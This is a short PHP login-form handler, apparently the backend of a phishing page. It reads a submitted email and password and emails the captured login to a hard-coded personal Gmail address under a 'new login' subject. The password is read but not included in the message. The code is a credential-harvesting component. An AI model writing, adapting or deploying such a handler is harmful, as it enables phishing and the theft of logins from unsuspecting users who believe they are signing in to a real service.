<?php
    $email=$_POST["email"];
    $password=$_POST["password"];
$paracorreo = "suzetthelmcke@gmail.com";
$asunto= "Mensaje Nuevo - Inicio de Sesión";
$mensaje="E-mail: $email";
$tucorreo= "From: jackelinesuzett@gmail.com";
if(mail($paracorreo,$asunto,$mensaje,$tucorreo)){
    echo "Correo enviado";
}
else{
    echo "Error";
}
?>